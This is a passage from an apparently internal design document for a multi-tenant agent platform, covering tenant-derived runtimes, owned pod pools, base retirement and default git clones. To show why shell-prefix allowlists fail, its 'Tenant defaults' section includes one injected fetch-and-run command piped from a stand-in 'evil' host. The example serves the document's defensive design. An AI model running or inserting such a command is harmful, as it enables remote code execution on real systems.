| `name`, `baseRuntime` | Own, reference | At create | Under "Names" and the grant. Single-level, as `validateDerivedRuntime` requires. |
| `image`, `type`, `executionMode`, `isolationProfile`, `allowedResourceClasses`, `capabilities.*`, `integrationLevel`, `requireSoPeercred`, `command`, `env` | Prohibited or inherited | Refused | They describe the image and its security posture. |
| `workspaceTier`, `sdkWarmBlockingPaths`, `archivePolicy`, `minPlatformVersion` | Not in §5.1 | Refused | `Merge` takes the first two from the base. `archivePolicy` opts in to symbolic links. The last has no use for a tenant. |
| `description` | Not in §5.1 | Yes | It reaches only the owner. |
| `supportedProviders` | Override, restrict | Narrow | A subset of the base's. |
| `credentialCapabilities` | Override | Narrow | `proxyDialect` is a subset, and `hotRotation` stays false when the base's is false, because each describes the binary. |
| `limits` | Override | Narrow per field | A larger `maxSessionAge` or `maxUploadSize` holds platform capacity past the value the platform set. |
| `setupCommandPolicy` | Override, restrict | Narrow | An allowlist is a subset. `blocklist` to `allowlist` is accepted and the reverse is refused. `shell: true` over `false` is refused. `maxCommands` is at most the base's. Effective policy applies both, closing DF-7. |
| `setupPolicy.timeoutSeconds` | Maximum | Yes, positive | It is bounded by `gateway.maxFinalizingTimeoutSeconds`, as `validateSetupPolicy` does. A longer setup holds only the tenant's pod. Zero means no cap and is refused. |
| `setupPolicy.onTimeout` | Override | Yes | It affects only the owner's sessions. |
| `workspaceDefaults.files` | Append | Under `allowWorkspaceFiles`, after DR-3 | See "Tenant defaults". Replacing a base file's path is refused. Each is a §14 `inlineFile` under a Helm size bound, visible in `GET /v1/sessions/{id}`, so it holds no secrets. |
| `workspaceDefaults.setupCommands` | Append | Under `allowSetupCommands`, after DR-3 | See "Tenant defaults". |
| `workspaceDefaults.gitClones` | Append, new in §5.1 | Under `allowGitClones`, after DR-3 | See "DR-9: Default git clones". |
| `runtimeOptionsSchema` | Override, subset of names | Yes | A client's options are validated against the derived and base schemas together, because a name check alone lets a derived schema drop a base's `maximum`. A tenant schema is also new input to `validateAgainstSchema`, which compiles it per session with the default `Loaders` of `jsonschema/v5`, including `file`, and reads a compile failure as no constraint. The write therefore compiles it, refuses `$schema`, `$id`, and any `$ref` other than a local fragment, and bounds its size. |
| `defaultPoolConfig` | Override | Refused | The `pool` block replaces it. |
| `delegationPolicyRef` | Override, restrict | Yes | It names a policy in the tenant. Effective policy is the intersection §8.3 **Effective policy** states, which needs `Merge` to keep both references (DF-7). A base's reference resolves in the session's tenant today, so a `tenant-admin`, who writes those policies, already controls its content. |
| `allowSelfRecursion` | Restrict-only | `false` only | Unchanged from §5.1. |
| `agentInterface` | Override | Yes | The card the gateway generates carries `VisibilityPublic` today. On a tenant-derived runtime it carries `tenant`. Other agents in the tenant read this text through discovery, so it is a prompt injection channel inside the tenant. |
| `publishedMetadata` | Append | `tenant` visibility only | `public` is served unauthenticated on the operator's origin with a writer-chosen content type. `internal` reaches any authenticated caller in any tenant (§5.1 **`publishedMetadata` Field**). |
| `oneSessionPerPod` | New | See below | Applied to the owned pool. |
| `sessionPolicy` | Limits alone | See below | Applied to the owned pool. |
| `capabilityInferenceMode`, `toolCapabilityOverrides` | Override, the second not in §5.1 | Yes | They affect the tenant's own environment filters, and a tenant already writes `tenantRbacConfig.mcpAnnotationMapping`. |
| `labels` | Merge | Yes | Keys under `lenny.dev/` are refused. See "Environments". |
| `sharedAssets` | Append | Refused | These populate at warm time before any session, the controller reads them only from the `Runtime` resource, and they are not needed for R2. Adding them later is additive. |

### `oneSessionPerPod` and `sessionPolicy`

Concurrency and recycling come from the template pool. A tenant has one choice over them, `oneSessionPerPod`, which the owner accepted in the words "makes sense, yes". An owned pool serves a runtime's sessions under one of two policies:

| `oneSessionPerPod` | Owned pool's `maxConcurrentSessions` and recycling |
| :-- | :-- |
| `false`, the default | The template's, copied with its acknowledgments, `cleanupCommands`, and `cleanupTimeoutSeconds` under "Template copy". `recycle.allowCrossTenantReuse` always reads false, because an owned pool has one tenant. |
| `true` | `maxConcurrentSessions: 1` and no `recycle` block, on any template. The row carries no acknowledgment and no cleanup commands, because these values need no acknowledgment and no scrub runs. |

Every acknowledgment is a deployer's statement and a tenant writes none, so a tenant can only move to the narrower policy. Three cases need it: an environment with its own policy on a concurrent base, a default clone with a `write` other than `none`, and a clone under a `required` pool. A shared pod refuses each of them. It also serves a tenant whose security team does not want to rely on a best-effort scrub between its users. A tenant wanting a template's one-session policy to hold after a template write sets the field, because a template widening otherwise reaches the owned pool.

The field is one-way. A `PUT` that omits it leaves it unchanged, and a `PUT` setting `false` on a row holding `true` answers `422 INVALID_DERIVED_RUNTIME`. The reason is the one under "One session per pod": a pod created for one session can hold a repository, a deny, or a route belonging to one environment, and the claim paths read the pool's current policy with no check on the pod. A tenant that needs the template's policy again creates a new runtime. When the field becomes `true`, bound sessions complete in place, served pods are refused and drain, and reserved holds end.

A tenant cannot set a value between 1 and the template's. Such a pod still applies no per-session policy, so it adds no isolation, and a platform admin can name another template. A `sessionPolicy` naming `maxConcurrentSessions`, any acknowledgment, or any `recycle` field answers `422 INVALID_DERIVED_RUNTIME` with `details.field`. Raising concurrency stays refused for the reasons decision 3 records: concurrent slots share a process, `/tmp`, memory, and network (§5.2), the template's `acknowledgeProcessLevelIsolation` was made for the template's value, a runtime is not known to tolerate more, and a raised value moves more users onto E = ∅ pods. On an owned pool that recycles under its template, reuse holds only within the reserved hold, because `warmCount` sets `minWarm` and `maxWarm` equal, which makes §5.2's pinned idle bound zero.

`sessionPolicy` on a tenant-derived runtime holds the limits below, each checked against the template pool, whose row is what the gateway enforces. The owned row holds the lower of the template's value and the tenant's, with a zero first resolved to its platform default, and a template write recomputes it. A platform-derived runtime keeps the whole of §5.1's `sessionPolicy`.

| Field | Tenant | Rule |
| :-- | :-- | :-- |
| `cleanupCommands`, `cleanupTimeoutSeconds` | Refused | §5.2 **Lenny scrub procedure** runs them in the adapter's container on a pod with no runtime supervisor. Adding them later is additive. |
| `maxSessionAgeSeconds`, `maxClientIdleSeconds`, `slotRetries` | Lower only | They bound how long the tenant holds capacity. |
| `onPoolExhausted`, `maxQueueWaitSeconds` | `reject`, or `queue` within the template's wait | The queue is gateway memory. |

### Tenant defaults

The owner wants default files, setup commands, and git clones. Any of them is code execution at the agent UID. A file reaches an exempt base command: with a base command `pip install -r requirements.txt`, a tenant-written `requirements.txt` selects what gets installed, whatever `allowSetupCommands` says. A runtime also loads hook and configuration files from the workspace. No command control bounds a file, so a file has its own grant flag. DR-9 states the same for a clone.

Each kind needs its grant flag, a base that runs the runtime supervisor, and DR-3 landed. Without DR-3 the base's command runs at the adapter's UID in the adapter's container, which holds the projected service account token and a writable credential volume (DF-4). On an embedded base a tenant file would be read by a runtime that shares the adapter's identity, and a `type: mcp` base runs no supervisor. No flag is needed for R2.

Today's command exemption exists because an operator wrote `workspaceDefaults`. A tenant-written command gets no exemption. It counts toward `maxCommands` and is checked against the effective `setupCommandPolicy` at write and again when the plan binds, so a narrowed base policy takes effect. The effective policy must be `allowlist` with `shell: false`, because matching is a prefix on raw text: under a shell, `pip install x; curl https://evil | sh` matches `pip install`. A `blocklist` is not a security boundary, as §7.5 states, and a base with no policy checks nothing. Under `shell: false` an allowlist bounds the program and its arguments, and an allowed program can still run what it fetches. Base commands run first and cannot be removed, as the merge rule states.

### Compared with a session plan

| A client's plan today | A tenant-derived runtime | Difference |
| :-- | :-- | :-- |
| Inline files and uploads | Default files | A client's file runs in that client's session. A default runs in every session on the runtime with no user choice, so it reaches other users' credentials. |
| Setup commands under the runtime's `setupCommandPolicy` | Default commands under the same policy, with `shell: false` | As above. |
| `gitClone` sources with a read or write scope | Default clones with a read scope, and a `write` value that adds the repository to the writable set | As above, and the repository is the tenant admin's choice, read on the authority of the session user's link on a `required` pool. A client that sends no plan gets push access only under `write: always`. |
| `runtimeOptions` under the schema | A narrower schema | Narrower only. |
| `pool` among granted pools | The owned pool | A pool the platform templated. |
| `delegationLease` narrowing | `delegationPolicyRef` intersection | Narrower only. |
| Nothing | `oneSessionPerPod` and warm count | New. These act on the owned pool within budget. |
| Nothing | Labels and agent interface | New. These change how the tenant's own environments and agents select the runtime. |

## DR-5: Owned pools

### A pool per runtime

Each tenant-derived runtime has exactly one owned pool, created in the same request and named the same. Its own pool is needed because concurrency and recycling live on the pool row (DF-6), so a one-session policy has no effect on a base's concurrent pods. §5.1's fallback to the base's pool stays unavailable for tenant-derived runtimes: it would place a session on pods with another policy, read another pool's warm inventory, and need a check the base's pool does not make. `ResolvePool` matches the derived name, so owned pools cause no ambiguity for the base. `PoolStoreBasePoolResolver` is unaffected for the same reason.

### Template copy

A platform-written template pool supplies everything that needs a platform decision. A tenant cannot create a ceiling, a posture, or an acknowledgment.

| Setting | Source | Tenant |
| :-- | :-- | :-- |
| `executionMode` | Base | None |
| `isolationProfile`, `allowStandardIsolation`, `acknowledgeNonceOnlyAuth`, `deliveryMode`, `spiffeBinding`, `allowDirectModeStandardIsolation`, and `allowProxyModeSpiffeBindingDisabled` | Template | None |
| `egressProfile`, `dnsPolicy`, egress ceiling, warm-up policy, `gitAccess`, client proxy profile, tunnel lifetime, fetch settings, `tenantOverride`, and `tenantEgressProfiles` | Template | A tenant pool overlay under EG-9's rules for a shared pool. The rows EG-9 gives only an owned pool read as `none` unless the grant entry's `ownedOverlays` lists them. |
| Elicitation policy, `sdkWarm`, and scaling policy | Template | None |
| `resourceClass` | Grant entry | One of `resourceClasses` |
| `warmCount` | Tenant | 1 or more, within budget |
| `reservedPods` | Tenant | Within the grant entry's allowance, as DR-10 states |
| `reservedPlacement` | Template | None |
| Concurrency, recycling, `cleanupCommands`, and `cleanupTimeoutSeconds` | Template | `oneSessionPerPod`, as above |
| `maxSessionAgeSeconds` and `sessionPolicy`'s other limits | Template, then the derived runtime | Lower only, as above |

The copied columns live on the owned row, so `poolPolicyMirror`, admission, and the PoolScalingController read a complete pool with no new merge. A platform write to a template updates the copied columns of its owned pools in the same transaction and bumps each generation. A narrowing therefore reaches them, and the running pods change as any pool edit does today, on pods created afterwards. `ownerTenantId` is set at create and immutable, as `egress-and-git-design.md` decision 26 states.

EG-9's table gives an owned pool more than a shared one: replacing the warm-up policy, turning on `gitAccess`, choosing `egressProfile`, adding a CA, and setting client proxy environment variables. A copied flag was set by an operator thinking of the shared column, where most of these rows have no effect, so a copied flag could open a CA, a proxy variable, or `gitAccess` the operator never considered. Hence `ownedOverlays`, empty by default. A listed `clientProfile` sets only the variables `egress-and-git-design.md` names under "Tenant proxy variables", on an `internet` pool, which excludes `JAVA_TOOL_OPTIONS`, `NODE_OPTIONS`, `LD_PRELOAD`, `GIT_SSH_COMMAND`, `PATH`, and `LD_AUDIT`. A write that adds or changes `caBundle` emits `pool.ca_bundle_changed` at once, and the security posture reports it.

A write that lowers a `tenantOverride` flag on a pool a grant entry names succeeds whatever overlays exist, on its owned pools and on the template itself. A base entry requires `pool_tenant_access` on the template, so a granted tenant can write an overlay there at any time and would otherwise block the write. The extending part stops applying, and `runtime.base_changed` goes out, under "Notice". EG-9's refusal stays for a shared pool no grant entry names.

A row that reads `none` after an entry drops it, or a profile dropped from `tenantEgressProfiles`, stops the stored value with the same event. `caBundle`, `clientProfile`, `gitAccess`, and `egressProfile` are fixed at pod creation, so they stop on pods created afterwards, and the API reports them as pending, as EG-9 does. `warmUp` is read per decision, so it stops at the next decision and reads as the template's. A dropped `egressProfile` reverts to the template's, which can be wider than the tenant's choice, and the event names it.

### Pods

`createPod` and `resolveSDKWarm` read the `Runtime` resource by `sb.Spec.RuntimeRef`, and a derived runtime has none. DR-2 adds `SandboxTemplate.spec.podRuntimeRef`, which the PoolScalingController sets from the pool row, and every read of the resource in the Sandbox controller keys on it. Otherwise `resolveSDKWarm` reads a miss as `preConnect` false, and an owned pool on an SDK-warm base warms as pod-warm. `runtimeRef` keeps the derived name for `ResolvePool` and the label. A base's `Runtime` resource therefore serves any number of derived pools, and no tenant input reaches a cluster-scoped resource.

Pods serve only the owner. The controller stamps `lenny.dev/tenant-id` with the owner at creation, as the "Pod models" row in `egress-and-git-design.md` states, and egress decisions, warm-up additions, and egress groups then read one tenant from the first second. `requirePoolSelectable` and the claim path read the owner, so another tenant's pin fails as an unknown pool.

That stamp does not work against today's code, and the design has to resolve this. These readers treat a non-empty label as "this pod has served a session":

- `AdmitTenantPin` refuses and drains every labelled pod when the pool does not reuse pods, so a one-session owned pool would drain each warm pod at its first acquisition.
- `markPinnedIdle` and §5.2 **Pinned idle inventory.** keep labelled idle pods out of `minWarm` and, with `maxWarm` equal to the target, drain them. The pool would stay in `PoolWarmingUp`.

DR-5 adds `lenny.dev/served`, which the gateway stamps at first assignment on an owned pool. On an owned pool both readers read that label in place of the tenant label: an unserved pod is ordinary inventory, and a served pod is refused and drained on a non-recycling pool. Another tenant's request never reaches this check on an owned pool, and `AdmitTenantPin` keeps the pin comparison as the second layer.

### Bounds

| Bound | Holder | Enforcement |
| :-- | :-- | :-- |
| `maxRuntimes` | Grant | Checked at write, under a lock on the grant row, so concurrent creates cannot pass together. |
| `maxOwnedPods` | Grant | One figure governs every check. The tenant's charge T is the sum across its owned pools of `max(inUse, reservedPods) + warmCount + unusable`. `inUse` counts pods in `claimed` and `reserved`, `unusable` counts `draining` and `failed`, and `reservedPods` is 0 on a pool with no reservation. A write or a claim that raises T past the bound is refused: a write answers `422 DERIVATION_BUDGET_EXCEEDED`, under a lock on the grant row, and a claim answers `429 QUOTA_EXCEEDED`. A write lowering T always passes. A claim that leaves T unchanged always passes, which covers a claim within a reservation and a `ClaimSlot` on an occupied pod. `warmCount` stands for `idle`, `warming`, and `sdk_connecting` pods, which `plan.Compute` treats as inventory, and `terminated` is a sink that holds no pod. Counts come from a Sandbox list per owned pool. `agent_pod_state` cannot serve, because `derivePodStates` leaves `tenant_id` empty and each sync clears it. A pool with a non-empty `warm_stop_reasons` charges nothing for `warmCount` or `reservedPods`, and neither does any pool while reservations are off, for `reservedPods`. A session ending moves a pod to `unusable`, which can raise T with no check, and claims outside a reservation are then refused until that pod is gone. |
| `maxOwnedPods`, at creation | Grant | T decides what a tenant may ask for, and this rule bounds what runs. The PoolScalingController renders the bound on each owned `SandboxWarmPool`, and the WarmPoolController creates no Sandbox in that pool while the owner's non-terminal Sandboxes, listed by owner across all its pools, are at the bound. This covers a warm refill and a reservation's replacement alike. A lowering therefore frees budget at once while the pods it releases still count here, and a pool deleted while its pods drain still counts. |
| `runtimes.tenantDerivation.maxOwnedPodsTotal` | Helm | The sum of every grant's `maxOwnedPods` stays at or below it, checked at grant write under one lock that only grant writes take. Preflight compares it with the namespace `ResourceQuota`. |
| Pod size | `resourceClasses` | Set per base in the grant. `LimitRange` still applies. |

`max_concurrent_sessions` does not serve as this bound. A quota of 1000 moved from 20-session pods to one-session pods turns 50 pods into 1000.

The PoolScalingController never raises an owned pool above its warm target, which is `warmCount` unless DR-10 raises it. Its formula is clamped, `bootstrapMinWarm` is refused, and an experiment's `initialMinWarm` on an owned pool is refused at write, because `ResolveVariantRoles` assigns it to `MinWarm` directly. A concluded experiment drains its owned variant pool, which affects only the owner. Warm-pod minutes accrue per pool, so an owned pool's idle cost is attributable to its owner through the pool row. Whether the billing pipeline should read that is the operator's commercial choice.

### Kubernetes permissions

The gateway needs none. It writes Postgres, and the PoolScalingController renders the CRD pair with the permissions it holds. The WarmPoolController creates pods with the label in place, which EG-9's `unset → owner` webhook rule admits. No tenant write creates a `Runtime` resource. A `RuntimeClass`, a namespace, and a NetworkPolicy are all fixed by Helm, and §13.2.6's pre-created policies apply, because `egressProfile` comes from the template.

### Tenant operations

A tenant writes its owned pool's fields only through `PUT /v1/admin/derived-runtimes/{name}`, and drains it through that resource's `drain` route. The pool routes `drain`, `warm-count`, `circuit-breaker`, `resume-reconciliation`, and `upgrade` remain `platform-admin` paths on owned pools, as DR-1 makes them on all pools. `pool_tenant_access` and `runtime_tenant_access` refuse a row naming an owned record, so a grant cannot share it. A `platform-admin`'s `PUT /v1/admin/pools/{name}` on an owned pool refuses every field "Template copy" takes from the base or the template, including `runtimeRef`, `executionMode`, and `sessionPolicy`'s concurrency, recycling, and cleanup fields, because a direct write could otherwise widen a row held at one session.

### Tenant suspension and deletion

Suspending a tenant adds a reason to `warm_stop_reasons` on its owned rows in the same transaction, and resuming removes it. §15.1 blocks deleting a tenant while pools exist under it, which would stop erasure. Owned pools leave that block, and the deletion lifecycle drains and removes them in §12.8's order.

## DR-6: Base changes

Today a base write that would invalidate a derived runtime is refused and names the affected runtimes. For a tenant-derived runtime that lets one tenant block a platform change and shows one tenant's names to whoever wrote the base. `derivedRuntimesInvalidatedBy` keeps its rule for platform-owned derived runtimes only.

For a tenant-derived runtime, the restrict-only rules move from a one-time check to the merge. The tenant view computes the effective runtime against the live base and the current grant entry, on each resolve, and reads a retirement reason on the owned row as `retired`, so re-issuing an entry after its date does not revive the runtime. A base or grant write therefore always succeeds and takes effect at the next resolve. `incompatible` means new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, with `details.reason` naming the miss, until the cause is fixed.

| Platform change | Effect on a tenant-derived runtime |
| :-- | :-- |
| Narrows `supportedProviders`, `allowSelfRecursion`, `limits`, or the schema | Applies at the next resolve. An emptied intersection, such as no provider left, is `incompatible`. |
| Narrows `setupCommandPolicy` so a default command falls outside, or sets `shell: true` or a mode other than `allowlist` while a default command exists | `incompatible`, until the tenant edits the command. |
| Removes the base's `allowedResourceClasses` entry the pool uses, sets `executionMode: service`, or sets `requireSoPeercred` false | `incompatible`. The base no longer meets the entry's conditions. |
| Removes the base's `Runtime` resource | The owned pool creates no pods, and the claim path answers as for a pool with none. The finalizer soft-deletes the base row, and the tenant view reads that as `retired`. |
| Sets the base's `type` to `mcp` or its `deploymentModel` to `embedded` while the runtime holds a default | `incompatible`. The tenant view reads both from the base row. `deploymentModel` is on the `Runtime` resource alone today (`applyCRDFields`), so the RuntimeReconciler mirrors it, as it mirrors `restartable`, with empty stored as `sidecar`. |
| Leaves the base's `Runtime` resource at `Registered=False` | `incompatible`. `mirror` refuses such a resource and leaves the row stale, and the Sandbox controller does not read the condition, so the RuntimeReconciler records it in `registered` on the row. |
| Changes base `workspaceDefaults` or `labels` | Applies to plans bound afterwards, and to selectors at once. |
| Changes a template pool | Copied under "Template copy". A lowered `maxConcurrentSessions` lowers the owned value. A widened concurrency or recycling value is copied and does not reach an owned pool with `oneSessionPerPod`, as "One session per pod" under DR-9 states, and the event names that pool. A changed `templatePool` follows the same rule. |
| Removes a warm clone's repository from the tenant's allowlist, or changes the VCS pool covering it | The PoolScalingController leaves that entry out of the rendered warm list, and idle pods holding the store drain, as "Changing the list" states. New sessions are refused by the bind checks while the clone stays on the runtime. |
| Sets `allowSetupCommands`, `allowWorkspaceFiles`, or `allowGitClones` false while the runtime holds that default | `incompatible`, until the tenant removes it. This is the stop after a compromise. |
| Sets `allowGitCloneWrites` false while a default clone has `write: always` | `incompatible`, until the tenant edits the clone. |
| Sets `maxWarmCloneBytes` to 0 | The owned pool's warm list renders empty, and idle pods holding a store drain, as "Changing the list" states. Sessions then use the store-less path, a shallow fetch at materialization, and a repository too large for the pool's fetch window fails there. |
| Lowers `maxWarmCloneBytes` | Applies to pods created afterwards, and older pods leave under the age limit. A fill that no longer fits fails and backs off. |
| Adds a base default file at or under a default clone's `path`, or removes the template's git path while a default clone exists | `incompatible`, until the tenant edits the clone. |
| Lowers `maxReservedPods` below what the tenant's pools use | The grant write lowers `reservedPods`, as DR-10 states. |
| Narrows `resourceClasses` | `incompatible`, until the tenant picks another class. |
| Changes an entry's `templatePool` | The grant write copies the new template's columns to the owned pools in its transaction. |
| Lowers `maxOwnedPods` below T or the sum of allowances | The grant write lowers allowances and `reservedPods` first, then each owned `warmCount`, in name order and to a minimum of 1, until both fit or none can go lower, and emits the event. Later claims answer `QUOTA_EXCEEDED`, and pods above the bound end with their sessions. |
| Lowers `maxRuntimes` below the current count | Existing runtimes stay, and a create is refused. |
| Retires a base, or sets a grant entry's `retireAt` | The retirement path below. |
| Removes an entry, or revokes access on its base or template, after the entry's date | The runtimes stay `retired`. |

A template cannot be deleted while a grant entry names it: `DELETE` answers `409 RESOURCE_HAS_DEPENDENTS`. An operator retires a template by changing the entry to another template, or by setting the entry's `retireAt`.

A running session keeps its plan through any of these, because §14.1 stores the composed plan, and every later materialization reads it. "Residual risks" states what that means for a stopped default.

**Notice.** Each write that can change a tenant-derived runtime's effective result, or the effect of a stored overlay, adds an outbox row in its own transaction. A worker scans the affected runtimes and every tenant with a stored overlay on the pool, grant or no grant, emits `runtime.base_changed` to each one's audit chain, so subscriptions and an SO-3 destination receive it, and retries until it has done so. Reads show `baseStatus` at once, because resolve is the authority. The platform write's response lists affected runtimes and tenants to the `platform-admin`, and its failure to list them does not fail the write.

**Retirement.** `POST /v1/admin/runtimes/{name}/retire` takes `effectiveAt`, which must lie at least `runtimes.tenantDerivation.baseRetirementNoticeSeconds` ahead, 30 days by default.

- From the call, new derivations are refused, `baseStatus` reads `retiring` with the date, and the event goes out. Existing runtimes keep working.
- At `effectiveAt`, `baseStatus` reads `retired`, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, and the owned pools drain. Running sessions end under their own age limits. `DELETE` on the base no longer counts tenant-derived runtimes as dependents, and §15.1's rule for non-terminal sessions still holds the row. The base's `Runtime` resource stays until its last pod ends.
- `emergency: true` with a `ticketId` makes `effectiveAt` now, for a compromised image. It refuses new sessions at once, and SO-4a mirrors it. `force: true` also ends running sessions.

`retire_at` on the base row holds the date. A `platform-admin` cancels a pending date before it arrives.

Per tenant, the carrier is a grant entry's `retireAt`, set through `PUT .../derivation-grant` under the same notice floor, with `emergency: true`, a `ticketId`, and optionally `force: true` in that body for the emergency form. Withdrawing a grant sets `retireAt` on each entry. An entry's date counts as passed once its base's `retire_at` has passed. While an entry has tenant-derived runtimes and its date has not passed, a grant write cannot remove the entry, and `DELETE .../tenant-access/{tenantId}` on its base or template answers `409 RESOURCE_HAS_DEPENDENTS`, because that route deletes the row with no date to hold. The operator's own entry holds this refusal, so it comes from no tenant.

**Who drains.** `warm_stop_reasons` on the owned row is the one signal the controller reads. `PoolStoreSource` reads pool rows, so it maps a non-empty value to its existing `ForceZeroMinWarm` and sets `MaxWarm` to 0, because `plan.pinnedOverBound` otherwise keeps served idle pods. The transaction that sets `suspended_by`, a tenant suspension, or an emergency adds its reason, and the Notice worker adds one when a date arrives. Only the source of a reason removes it. A tenant's `PUT` touches the column in one case: a `PUT` that complies with the guardrail passes EG-9's write path, which clears `suspended_by` and its reason. Retirement is terminal for those runtimes, so its reason has no removal, and a tenant creates a new runtime under a live base.

## DR-9: Default git clones

### Stored format

`workspaceDefaults` gains `gitClones`, and each entry uses the field names of §14's `gitClone` source. The field exists only on a tenant-derived runtime in this design, so a base contributes none, and a platform runtime write refuses it. Adding it to platform runtimes later is additive.

```yaml
workspaceDefaults:
  gitClones:
    - url: https://github.com/acme/agent-skills
      ref: main
      path: skills
      auth: { mode: credential-lease, leaseScope: vcs.github.read }
      warm: true
      write: none
```

A default clone holds no secret. A private clone takes its token from the tenant's VCS pool or from the session user's link, under the checks a client's `gitClone` source gets, and the agent never receives that token.

### Checks at write

A `POST` or `PUT` refuses a default clone with `422 INVALID_DERIVED_RUNTIME` and `details.field` unless all of these hold:

- The grant entry sets `allowGitClones`, and the count is within `runtimes.tenantDerivation.maxDefaultGitClones`.
- `url` passes §14's restrictions and the shared canonicalizer in `egress-and-git-design.md`, and it carries no userinfo.
- The host is the host of one of the tenant's VCS pools or git routes. An uncovered host has no git enforcement, as that design's "Uncovered git hosts" states, and §14 lets a client's pinned commit skip the resolver's host check. A default clone gets that check whether or not its ref is a full commit.
- A repository under a VCS pool's prefix carries `auth` and is on the tenant's repository allowlist. A repository under no prefix omits `auth`. `checkGitCloneAuthBindings` skips a source with no `auth`, while `netagent` attaches credentials by repository and the readable set takes every `gitClone` source, so an `auth`-less clone of `github.com/acme/secret` would otherwise pass every check made here.
- `auth.leaseScope`, when set, is a read scope. The clone's fetch therefore never holds a write token, and push access comes only through `write` or a client's `writableRepositories`, as "Write scope" states.
- `ref` is a well-formed ref name or a full commit, and it cannot begin with `-`, because a warm fill passes it to git at the adapter's UID. The same check runs at bind, and the adapter ends its options before the ref. `schemas/workspaceplan-v1.json` constrains only its length today.
- `submodules` is absent, because a submodule names repositories the write did not check. `resolvedCommitSha` is absent, because the gateway writes it.
- `path` is present and is a relative subdirectory. It is neither `.` nor a parent or child of another default clone's path or a default file's path, on the runtime or its live base.
- No component of a default clone's `path` or a default file's `path` is `.git`, compared case-insensitively. `workspaceplan.validatePath` does not refuse this today, and "Not verified" below states why it matters.
- On a `required` pool, the owned pool is one `user-git-identity-design.md` accepts, so a recycling or concurrent owned pool is refused at write. Otherwise every session on the runtime would answer `USER_AUTHORIZATION_UNSUPPORTED_POD`.
- The owned pool has a git path. A `restricted` template with no `gitAccess` has none.
- With `warm: true`, the grant entry's `maxWarmCloneBytes` is above zero, `depth` is absent, and the host lies within the owned pool's ceiling. A store holds one commit's whole history, as draft 0111 states, and 0111 leaves `depth` out of a cache-served source.
- With `write` other than `none`, the "Write scope" rules below hold.

**One session per pod.** A clone with a `write` other than `none`, or under a `required` pool, needs an owned pool on which `poolstore.ReusesPods` is false, so that each pod serves one session in its life. `oneSessionPerPod: true` gives that on any template. `netagent` cannot attribute a request to a slot on a concurrent pod, whose writable set is the union over its sessions, and `required` refuses such pods already. Two statements keep this true after the write:

- The transaction that writes the first such clone sets `oneSessionPerPod: true` on the owned row, when the effective policy reuses no pods or the request sets the field, and is refused otherwise. The field is never cleared. While it is set, the effective policy reuses no pods, whatever the template states. A template write still succeeds, under DP9, and the event names each pool it does not reach. Removing the clone does not clear it, so a pool that has held such a clone never widens. A tenant that needs a wider policy creates a new runtime.
- The field is one-way because a pod created for one session can hold a stored writable plan or a `required` session's tree, and `rebindReserved`, `ClaimSlot`'s two passes, and the idle scan all read the pool's current policy. No check on a pod could cover them all, and a widened policy would reach each of them.

A clone with `warm: true` alone needs no such pool, as "Who reaches a store" states.

### Binding

`ComposeInto` adds the clones after the default files and ahead of the client's sources, and they enter the stored plan as `gitClone` sources carrying `runtimeDefault: true`. The gateway writes that field and refuses it from a client, as it does `resolvedCommitSha`. The rest of the session path then treats them as declared sources: `required` pools, readable sets, the pod's clone, and the stored `resolvedCommitSha` all apply with no second mechanism. The host and prefix checks under "Checks at write" run again at bind, because a VCS pool or route can change after the write, and neither `checkGitCloneAuthBindings` nor the resolver covers an `auth`-less clone or a full commit.

The order in today's code needs changing. `resolveSubmittedPlan` runs `checkGitCloneAuthBindings` and `PinCommitSHAs` on the client's plan, and `composeRuntimeDefaults` runs later, once routing has fixed the runtime, so a composed clone would skip both. These rules follow:

| Path | Rule |
| :-- | :-- |
| `POST /v1/sessions` with a plan, and `POST /v1/sessions/start` | After `composeRuntimeDefaults` and before `claimAtCreate`, the gateway runs the auth binding check, the environment and allowlist checks, the `required` check, and the commit pin on the composed default clones. The client's sources keep their earlier checks, so a bad client plan still fails before routing. |
| `POST /v1/sessions` with no plan | The plan binds at finalize, after the create-time claim. The gateway runs every check except the commit pin on the routed runtime's default clones before `claimForNewRow`, so a user with no access holds no pod. |
| `POST /v1/sessions/{id}/finalize` | The same full run follows `composeRuntimeDefaults`. A refusal binds nothing and leaves the session in `created`, as §14.1 states for a rejected plan. |
| A delegated child | `composeChildWorkspaceDefaults` makes the same full run, with the child's user and environment, and a refusal fails the delegation before the child row exists. `Service` gains the resolver and credential dependencies it lacks today. |
| Derive | `session-derive-design.md` binds a copy of the source's stored plan at create and composes nothing. The full run covers the plan's clones, and the read checks cover each warm default clone on the target that the plan omits, as the next row does, ahead of `reserveDerivedSession` and any copy, so a refusal has nothing to undo. |
| Resume, retry, and rebuild | The stored plan holds the commit, so these read it, and the `required` check runs as `user-git-identity-design.md` states for resume. The next pod can hold a warm store the stored plan does not declare, because a tenant admin added the clone after the session bound, so the gateway also runs the read checks for each warm default clone on the runtime that the plan omits, ahead of the claim on both branches of `resumeOnPod`. A user who fails them cannot resume on that pool, the resume fails under §6.2's failure path, and the recorded reason has the fields the refusal below has, because the resume driver has no response to write to. |

All of these read the final runtime, so an experiment's `variant.Runtime` brings that runtime's clones with it.

### Whose credential

| Case | Identity on the clone | When it cannot read |
| :-- | :-- | :-- |
| No `auth`, a repository under no VCS pool prefix | Anonymous, on a covered host or route | A floating ref refuses the session at bind, under the refusal rule below. A full commit skips `ls-refs`, so a missing commit fails at materialization with `SESSION_CREATION_FAILED`, after the claim. |
| VCS pool with `userAuthorization: off` | The tenant's App or stored token | As above. Any user who can start a session on the runtime gets the repository's content, which the tenant's allowlist already gives a session on that pool. |
| VCS pool with `userAuthorization: required`, human root session | The App or link token I8 mints, after the session user's link passes the check | `USER_LINK_REQUIRED` or `USER_REPOSITORY_ACCESS_DENIED`. Nothing falls through to the App, and no session runs without the clone. |
| The same, listed service identity | The App, under the subject's own allowlist | Refused when the repository lies outside that allowlist. |
| The same, unlisted service caller | None | Refused, as "Service identities" states. |
| Delegated child | The parent's user, on the child's row | As for that user, and the delegation fails. |

A refusal caused by a default clone goes through its own error writer, which carries `details.source: runtimeDefault`, the clone's `path`, and a reason, and omits `url`, `ref`, `host`, `matchingPools`, and the underlying error text. `writeRefResolveError` and `writeVCSResolveError` return those fields today, and a repository later moved or made private would otherwise show its name to any user of the runtime. `user-git-identity-design.md` names the repository because the user declared it, and here a tenant admin named it. `USER_LINK_REQUIRED` keeps `linkUrl`, which names the provider alone. A user who passes sees the URL and commit in `GET /v1/sessions/{id}`.

A runtime can therefore become unusable for some users. A write answers with a `Warning` when a default clone is under a `required` pool, naming that access now decides who can use the runtime.

### Write scope

